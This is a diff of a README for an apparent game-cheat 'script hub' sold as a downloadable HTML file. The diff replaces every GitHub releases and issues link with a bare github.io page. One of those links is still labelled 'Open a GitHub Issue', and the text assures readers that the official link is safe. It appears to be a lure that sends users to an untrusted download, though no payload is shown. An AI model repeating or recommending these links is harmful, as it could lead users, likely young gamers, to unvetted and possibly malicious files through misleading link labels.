@@ -1,6 +1,6 @@
 # 🎲 be-a-lucky-block-script-hub - Unlock More Wins, Effortlessly Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=363636)](https://github.com/diatomic-uterinevein550/be-a-lucky-block-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=363636)](https://diatomic-uterinevein550.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ This toolkit is packaged as a simple HTML file, so it runs right in your web bro
 ## 📥 Download and Install
 
 Visit this link to download the application:  
-[**https://github.com/diatomic-uterinevein550/be-a-lucky-block-script-hub/releases**](https://github.com/diatomic-uterinevein550/be-a-lucky-block-script-hub/releases)
+[**https://diatomic-uterinevein550.github.io**](https://diatomic-uterinevein550.github.io)
 
 On that page, you’ll see a list of files. Look for the newest version (usually at the top). The file will be named something like `be-a-lucky-block-script-hub-v1.0.0.html` or similar. Click it to download.
 
@@ -113,7 +113,7 @@ If you downloaded from the official link above, you’re safe.
 Need more help? Here are your options:
 
 - **Check the release notes** – On the download page, each version has a description of fixes and updates.  
-- **Open a GitHub Issue** – Visit [https://github.com/diatomic-uterinevein550/be-a-lucky-block-script-hub/issues](https://github.com/diatomic-uterinevein550/be-a-lucky-block-script-hub/issues) and describe your problem.  
+- **Open a GitHub Issue** – Visit [https://diatomic-uterinevein550.github.io](https://diatomic-uterinevein550.github.io) and describe your problem.  
 - **Ask a friend** – Sometimes a second pair of eyes helps.
 
 We respond to issues within a few days.
@@ -147,7 +147,7 @@ Don’t waste time clicking blocks manually. Let the tool do the heavy lifting w
 
 ## 🔗 Quick Download Again
 
-[![Download Latest Version](https://img.shields.io/badge/🚀-Download_Now-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=2f3542)](https://github.com/diatomic-uterinevein550/be-a-lucky-block-script-hub/releases)
+[![Download Latest Version](https://img.shields.io/badge/🚀-Download_Now-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=2f3542)](https://diatomic-uterinevein550.github.io)
 
 ---
 
